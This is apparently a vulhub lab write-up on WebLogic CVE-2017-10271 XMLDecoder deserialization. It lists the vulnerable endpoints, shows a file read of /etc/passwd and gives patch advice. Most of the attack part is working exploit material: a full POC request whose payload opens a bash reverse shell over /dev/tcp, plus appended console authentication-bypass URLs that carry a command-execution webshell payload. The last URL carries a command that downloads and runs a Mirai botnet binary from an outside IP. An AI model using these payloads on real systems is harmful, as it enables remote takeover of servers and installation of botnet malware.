[vulhub] Weblogic CVE-2017-10271 Vulnerability Replication &amp; Traffic Analysis
Weblogic CVE-2017-10271 Vulnerability Replication & Traffic Analysis
Weblogic CVE-2017-10271 XMLDecoder Deserialization
1.Weblogic-XMLDecoder vulnerability analysis
0x01 Pre-existing and present:

- weblogic:7001 port

Redis: port 6379

; tomcat:8009 port

There is an arbitrary file read download vulnerability here: http://your-ip:7001/hello/file.jsp?path= 

If reading the passwd file: http://your-ip:7001/hello/file.jsp?path=/etc/passwd

First, the vulnerability was predecessor CVE-2017-3506, but this patch only limited the bug fix to the same restrictions as the blacklist and did not solve in principle, resulting in the emergence of CVE-2017-10271 vulnerability.The RCE can be triggered to execute commands remotely by bypassing the patch's limitations.
0x02 refers to version:

​ 10.3.6.0，12.1.3.0，12.2.1.1，12.2.1.2
0x03 Use Posture:
2. The vulnerability lies in:

    ''' for example '''
    http://IP:7001/wls-wsat/CoordinatorPortType

3. Other available URI s:

    /wls-wsat/CoordinatorPortType
    /wls-wsat/RegistrationPortTypeRPC
    /wls-wsat/ParticipantPortType
    /wls-wsat/RegistrationRequesterPortType
    /wls-wsat/CoordinatorPortType11
    /wls-wsat/RegistrationPortTypeRPC11
    /wls-wsat/ParticipantPortType11
    /wls-wsat/RegistrationRequesterPortType11

4. How to use it?

Change content-type to text/xml by choosing any of the above eight paths
That is, content-Type:text/xmlAnd then post in payload to replicate the vulnerability. If this is a modification type, you will receive a return package with content of unsupported type.
5. POC

    ''' rebound shell '''
    ''' Watch for bounce shell Statement needs to be done as follows url Code '''

    POST /wls-wsat/CoordinatorPortType HTTP/1.1

    Host: your-ip:7001

    Accept-Encoding: gzip, deflate

    Accept: */*

    Accept-Language: en

    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

    Connection: close

    Content-Type: text/xml

    Content-Length: 641



    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>

    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">

    <java version="1.4.0" class="java.beans.XMLDecoder">

    <void class="java.lang.ProcessBuilder">

    <array class="java.lang.String" length="3">

    <void index="0">

    <string>/bin/bash</string>

    </void>

    <void index="1">

    <string>-c</string>

    </void>

    <void index="2">

    <string>bash -i &gt;&amp; /dev/tcp/192.168.124.141/1234 0&gt;&amp;1</string> 

    </void>

    </array>

    <void method="start"/></void>

    </java>

    </work:WorkContext>

    </soapenv:Header>

    <soapenv:Body/>

    </soapenv:Envelope>

6. Package Grabbing Analysis

0x01 Build Bounce shell Process Grab

0x02 Bounce shell execution command grab

7. Repair Suggestions

    Update Oracle patches

    Access to wls-wsat resources acl access control rules on firewalls or routers and switches

    Delete the appropriate war package without affecting the business

        rm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war
        rm -f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
        rm -rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat

    After restarting weblogic, see if the eight URI s in the wls-wsat/directory are accessible, such as 404, which is deleted successfully.

8. Reference Articles

https://www.freebuf.com/articles/web/197339.html - weblogic from getting started to giving up

https://www.freebuf.com/vuls/179579.html --- weblogic JAVA deserialization

Authentication Bypass

/console/images/%2e%2e%2fconsole.portal
/console/images/%2e%2e%2fconsole.portal
/console/images/../console.portal
/console/console.portal
/console.portal?_nfpb=true&_pageLabel=JmsSAFAgentSAFAgentTablePage&
handle=com.bea.console.handles.JMXHandle("com.bea:Name=base_domain,
Type=Domain")

/console/css/%252e%252e%252fconsolejndi.portal

/console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread%20currentThread%20=%20
(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20
=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);
%20String%20cmd%20=%20req.getHeader(%22cmd%22);String%5B%5D%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String%5B%5D%7B%22
cmd.exe%22,%20%22/c%22,%20cmd%7D%20:%20new%20String%5B%5D%7B%22/bin/sh%22,%20%22-c%22,%20cmd%7D;if(cmd%20!=%20null%20)%7B%20String%20result%20=%20new%20java.util.Scanner
(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22%5C%5CA%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20
(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream
(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();%7D%20currentThread.interrupt();')

console/css/%252e%252e%252fconsole.portal

/console/css/.%252e/console.portal

/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&
handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec
('wget%20http://83[dot]97.20.90/mirai.x86%20-O%20/tmp/kpin;chmod%20777%20/tmp/kpin;/tmp/kpin');
%22);
